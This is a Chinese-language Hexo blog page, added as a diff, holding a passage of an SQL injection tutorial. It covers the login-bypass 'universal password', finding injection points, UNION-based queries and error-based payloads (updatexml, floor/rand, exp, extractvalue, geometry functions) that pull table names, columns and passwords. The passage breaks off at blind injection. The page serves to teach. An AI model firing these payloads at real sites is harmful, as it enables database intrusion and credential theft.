@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+<head>
+    
+    <title>Hexo</title>
+    <meta charset="UTF-8">
+    <meta name="keywords" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+    
+    <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+    <meta name="description" content="SQL注入课题​																																	by caef11 原理sql注入的原理可以从一整个sql查询语句看起 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&amp;#x27;$id&amp;#x27; LIMIT 0,1&quot;;  双引号内即是完整的查询语句，id是我们提交的内容，但实际上，我们提交的内容可以跳出这个单引号，或">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="http://caef11.github.io/2023/01/21/sql%E5%B0%8F%E8%AF%BE%E9%A2%98%EF%BC%88%E5%9F%BA%E7%A1%80%E7%89%88/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="SQL注入课题​																																	by caef11 原理sql注入的原理可以从一整个sql查询语句看起 1$sql&#x3D;&quot;SELECT * FROM users WHERE id&#x3D;&amp;#x27;$id&amp;#x27; LIMIT 0,1&quot;;  双引号内即是完整的查询语句，id是我们提交的内容，但实际上，我们提交的内容可以跳出这个单引号，或">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s1.ax1x.com/2023/01/11/pSnpP0J.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/01/11/pSnpCm4.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/01/11/pSnppXF.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/01/11/pSnk63R.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/01/11/pSnkbvt.png">
+<meta property="og:image" content="c:\Users\15819\AppData\Roaming\Typora\typora-user-images\image-20230111145807357.png">
+<meta property="og:image" content="c:\Users\15819\AppData\Roaming\Typora\typora-user-images\image-20230111142700424.png">
+<meta property="og:image" content="c:\Users\15819\AppData\Roaming\Typora\typora-user-images\image-20230111145339785.png">
+<meta property="og:image" content="https://s1.ax1x.com/2023/01/11/pSnVi7T.png">
+<meta property="article:published_time" content="2023-01-21T10:18:06.958Z">
+<meta property="article:modified_time" content="2023-01-11T07:09:28.937Z">
+<meta property="article:author" content="caef11">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s1.ax1x.com/2023/01/11/pSnpP0J.png">
+    
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+    <link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1674296384930">
+    
+    <link rel="stylesheet" href="/css/style.css?v=1674296384930">
+
+    
+        
+            <link rel="stylesheet" href="/custom.css?v=1674296384931">
+        
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="mdui-drawer-body-left">
+    <div id="nexmoe-background">
+        <div class="nexmoe-bg" style="background-image: url(https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png)"></div>
+        <div class="mdui-appbar mdui-shadow-0">
+            <div class="mdui-toolbar">
+                <a mdui-drawer="{target: '#drawer', swipe: true}" title="menu" class="mdui-btn mdui-btn-icon mdui-ripple"><i class="mdui-icon nexmoefont icon-menu"></i></a>
+                <div class="mdui-toolbar-spacer"></div>
+                <!--<a href="javascript:;" class="mdui-btn mdui-btn-icon"><i class="mdui-icon material-icons">search</i></a>-->
+                <a href="/" title="caef11" class="mdui-btn mdui-btn-icon"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="caef11"></a>
+            </div>
+        </div>
+    </div>
+    <div id="nexmoe-header">
+        <div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="caef11">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="caef11" alt="caef11">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>文章</span>2</div>
+        <div><span>标签</span>0</div>
+        <div><span>分类</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/donate.html" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/about.html" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    <aside id="nexmoe-sidebar">
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="搜索"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com/?_wv=1027&k=5CfKHun"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/20238211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/nexmoe/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">文章归档</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/">2023</a><span class="archive-list-count">2</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">最新文章</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/01/21/sql%E5%B0%8F%E8%AF%BE%E9%A2%98%EF%BC%88%E5%9F%BA%E7%A1%80%E7%89%88/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2023/01/21/hello-world/">Hello World</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://xiaoshu.app/" target="_blank" >
+                    <img src="https://xsm.nexmoe.com/images/Infinite/Snipaste_2022-05-18_20-46-50.png" alt="小舒同学"></img>
+                    <p>小舒同学</p>
+                </a>
+            </li>
+        
+            <li>
+                <a href="https://nexmoe.com/" target="_blank" >
+                    <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="折影轻梦"></img>
+                    <p>折影轻梦</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+</aside>
+    <div class="nexmoe-copyright">
+        &copy; 2023 caef11
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">鄂ICP备2020018486号</a> <br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral"> <img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a>
+    </div>
+</div><!-- .nexmoe-drawer -->
+    </div>
+    <div id="nexmoe-content">
+        <div class="nexmoe-primary">
+            <div class="nexmoe-post">
+
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png" alt="" loading="lazy">
+            <h1></h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2023年01月21日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="SQL注入课题"><a href="#SQL注入课题" class="headerlink" title="SQL注入课题"></a>SQL注入课题</h1><p>​																																	<strong>by <u>caef11</u></strong></p>
+<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>sql注入的原理可以从一整个sql查询语句看起</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="subst">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>双引号内即是完整的查询语句，id是我们提交的内容，但实际上，我们提交的内容可以跳出这个单引号，或者是其他闭合符号来执行其他SQL语句。通常是攻击者构造恶意的SQL语句来欺骗有漏洞的网站，让恶意的SQL语句在数据库中被执行。</p>
+<p>这里顺带可以解释一下万能密码。登录时的后端代码是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$username</span>&#x27; and password=&#x27;<span class="subst">$password</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>当我们在输入框中输入admin ‘ and 1&#x3D;1#</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;admin&#x27; and 1=1 #&#x27; and password=&#x27;<span class="subst">$password</span>&#x27; &quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>其实最后执行的是</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;admin&#x27; and 1=1&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>返回为真就可以成功登录了，这算是非常典型的sql注入了。</p>
+<h3 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h3><p>information_schema 顾名思义就是一个信息库，是用来存储数据库的元数据（比如数据库，表的名称，列的数据类型或者访问权限等），在每个 MySQL 实例中，information_schema 保存了它维护的所有数据库的信息，这个库中包含了很多只读的表（它们实际上可看作为视图，因此并没有与之关联的文件，你也无法为它们创建触发器）。</p>
+<p>这个库中最重要且在一般的注入中最常见的三张表就是schemata、tables、columns，这三张表中记录了库名表名字段名这几个我们select时要用到的信息。<a target="_blank" rel="noopener" href="https://imgse.com/i/pSnpP0J"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s1.ax1x.com/2023/01/11/pSnpP0J.png" alt="pSnpP0J.png" data-caption="pSnpP0J.png" loading="lazy"></a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/pSnpCm4"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s1.ax1x.com/2023/01/11/pSnpCm4.png" alt="pSnpCm4.png" data-caption="pSnpCm4.png" loading="lazy"></a><br><a target="_blank" rel="noopener" href="https://imgse.com/i/pSnppXF"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s1.ax1x.com/2023/01/11/pSnppXF.png" alt="pSnppXF.png" data-caption="pSnppXF.png" loading="lazy"></a></p>
+<h3 id="常见大类"><a href="#常见大类" class="headerlink" title="常见大类"></a>常见大类</h3><h4 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h4><p>联合注入的前提是要有回显，否则联合查询的查询结果得不到回显的话是无效的。联合注入要先判断判断注入点，主要是猜测原sql语句的闭合方式和是否存在漏洞。</p>
+<p>一般来说检测注入分为两种类型：字符型和数字型。</p>
+<p>字符型：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=&#x27;$id&#x27; LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>?id&#x3D;1’     会导致报错，在后面加一个%23或者#或者–+注释符后会正常显示 </p>
+<p>?id&#x3D;1’ and 1&#x3D;1#回显正常 </p>
+<p>?id&#x3D;1’ and 1&#x3D;2#报错。这就说明是字符型。当然，闭合符号不知有单引号还有” “|’’’ ‘’’|(‘ ‘)|(“ “)等等。 </p>
+<p>数字型:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">sql</span><span class="operator">=</span>&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br></pre></td></tr></table></figure>
+
+<p>就是没有闭合符号的字符型。</p>
+<p>?id&#x3D;1 and 1&#x3D;1 回显正常</p>
+<p>?id&#x3D;1 and 1&#x3D;2 报错。这样就是数字型。</p>
+<p>随后就是查询列数。用order by 来查询表中有几个字段，一般都是猜解，列数为恰好报错的列数减一。当我们查询的字段只有3位时，order by x ，若x&gt;3则会产生报错，当x&#x3D;4时报错，&#x3D;3时不报错，可以得出查询的字段数量为3。</p>
+<p>之后就要开始使用union，union意为联合，实际上就是联合两个select语句，将两个select的查询结果合并，这也是为什么通常前面一句select的查询要是空集，否则无论后面一个select怎么写，都会是前一句的查询结果，但是并不排除有要前一个select也成立的情况。因为前一个结果如果不理想，则会对后一个语句的回显造成影响。</p>
+<p>拼接后基本上就是这样的格式：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">where</span> id<span class="operator">=</span><span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> # <span class="string">&#x27; LIMIT 0,1;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p>一般来说常见的是三个函数：updatexml | floor | exp。</p>
+<ol>
+<li><h5 id="updatexml："><a href="#updatexml：" class="headerlink" title="updatexml："></a>updatexml：</h5><p>这是一个替换函数。</p>
+<p>updatexml(XML_document,XPath_string,new_value);”</p>
+<p>XML_document：String格式，为XML文档对象的名称，</p>
+<p>DocXPath_string：Xpath格式的字符串</p>
+<p>new_value：String格式，替换查找到的符合条件的数据</p>
+<p>concat()函数是将其连成一个字符串，然后~开头不是xml的语法，因此不会符合XPATH_string的格式，从而出现格式错误</p>
+<p>然后报错会返回从<del>开头到</del>结尾（0x7e对应~）</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(<span class="keyword">SELECT</span> version()),<span class="number">0x7e</span>),<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pSnk63R"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s1.ax1x.com/2023/01/11/pSnk63R.png" alt="pSnk63R.png" data-caption="pSnk63R.png" loading="lazy"></a>注入举例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;+updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)%23</span><br></pre></td></tr></table></figure>
+
+<p>这边的+号会被转义成空格，%23是#的url编码，可以任意选择使用。</p>
+</li>
+<li><h5 id="floor："><a href="#floor：" class="headerlink" title="floor："></a>floor：</h5><p>floor本来是向下取整。</p>
+<p>​	floor()报错注入的原因是group by在向临时表插入数据时，由于rand()多次计算导致插入临时表时主键重复，从而报错，又因为报错前concat()中的SQL语句或函数被执行，所以该语句报错且被抛出的主键是SQL语句或数执行后的结果。</p>
+<p>​	主要是因为count()与group by联合使用时，会出现一个虚拟表，然后依次查询group by插入至一张含主键key，数量count的虚拟表中，按分组来插入，相同主键的数量+1；</p>
+<p>​	floor(rand(0)*2)的值为011011 ，因为rand()在数据库中执行完成的速度更快。数据库运行命令时，首先在虚拟表中查询是否有相同的主键或分组，然后进行插入操作。</p>
+<p>或者说：</p>
+<p>​	(1)当我们查询floor(rand(0)*2)的值的第一位0时,发现虚拟表中没有0这个主键，然后准备新建主键|分	组操作，但是由于rand()函数特性(执行更快)，我们插入时发现0已经不存在了，因此我们插入第二位	值1。</p>
+<p>​	(2)第二位插入完后查询第三位1，发现主键中已经有1，因此主键1对应的数量count()+1。</p>
+<p>​	(3)查询第四位值0时，发现0在虚拟表中没有主键，因此再次执行新建主键|分组操作，但由于rand函	数特性，插入时发现0已经不存在，新建的分组|主键中插入第五位值1，因此产生主键冲突的报错。</p>
+<p>​	简单来说，floor报错的原理是rand和order by或group by 的冲突。</p>
+<p>需要用到以下函数：</p>
+<p>floor(x) &#x2F;&#x2F;向下取整，即取不大于x的最大整数。</p>
+<p>rand(x) &#x2F;&#x2F;随机产生一个0-1之间的浮点数,当指定参数x之后，每次生成的值都是一样的,故称之为固定的伪随机数字(产生的数字都是可预知的)就比如rand(0)</p>
+<p>count(*) &#x2F;&#x2F;返回值的条目，与count()的区别在于其不排除NULL，count()如果统计到NULL,返回的结果即为NULL，返回列数。</p>
+<p>group by &#x2F;&#x2F;分组的意思</p>
+<p>完整语句：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),database())a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b;</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b;</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b;</span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span><span class="operator">+</span><span class="built_in">count</span>(<span class="operator">*</span>),concat(<span class="built_in">floor</span>(rand(<span class="number">0</span>)<span class="operator">*</span><span class="number">2</span>),(<span class="keyword">select</span> <span class="string">&#x27;password&#x27;</span> <span class="keyword">from</span> <span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>))a <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> a)b;</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://imgse.com/i/pSnkbvt"><img onerror="imgOnError(this);" data-fancybox="gallery" src="https://s1.ax1x.com/2023/01/11/pSnkbvt.png" alt="pSnkbvt.png" data-caption="pSnkbvt.png" loading="lazy"></a>因为操作数应该至少包含一列，所以要加select 1 ，因为每个派生表都要又自己的别名，所以要加a和x。</p>
+</li>
+<li><h5 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h5><p>exp(n)本来的作用是返回e的n次方，所以exp报错是个溢出报错，利用溢出特性和双层嵌套查询，使数据库将错误信息返回，(数据库优先执行括号语句)这时，双层语句内部就会执行，但是它不会回退，所有就带着第一层语句+信息返回，达到我们目的 。 </p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> <span class="built_in">exp</span>(<span class="operator">~</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">user</span>())x)) #</span><br></pre></td></tr></table></figure>
+
+<p>本来其实是exp(n)  n&gt;709的时候会造成溢出报错，不过这里也没有什么很大的关系。</p>
+<p><a target="_blank" rel="noopener" href="https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/">https://osandamalith.com/2015/07/15/error-based-sql-injection-using-exp/</a></p>
+<p>这篇文章里还有insert|update|delete时的exp报错利用。</p>
+</li>
+<li><h5 id="extractvalue："><a href="#extractvalue：" class="headerlink" title="extractvalue："></a>extractvalue：</h5><p>extractvalue()本来用于返回目标xml中包含查询值的字符串。</p>
+<p>EXTRACTVALUE (XML_document, XPath_string);<br>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc<br>第二个参数：XPath_string (Xpath格式的字符串)<br>concat:返回结果为连接参数产生的字符串。<br>原理和updatexml其实是相同的。都是~不符合xml语法</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,concat(<span class="string">&#x27;~&#x27;</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">&#x27;~&#x27;</span>)));</span><br></pre></td></tr></table></figure>
+
+<p><img onerror="imgOnError(this);" data-fancybox="gallery" src="C:\Users\15819\AppData\Roaming\Typora\typora-user-images\image-20230111145807357.png" alt="image-20230111145807357" data-caption="image-20230111145807357" loading="lazy">以下比较冷门</p>
+</li>
+<li><p>geometrycollection（5.5&lt;mysql版本&lt;5.6）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>multipoint（5.5&lt;mysql版本&lt;5.6）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>polygon（5.5&lt;mysql版本&lt;5.6）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>multipolygon（5.5&lt;mysql版本&lt;5.6）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>linestring（5.5&lt;mysql版本&lt;5.6）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>multilinestring（5.5&lt;mysql版本&lt;5.6）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> test <span class="keyword">where</span> id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="布尔注入"><a href="#布尔注入" class="headerlink" title="布尔注入"></a>布尔注入</h4><p>布尔注入是一种盲注，是在不知道数据库返回值的情况下对内容进行猜测</p>
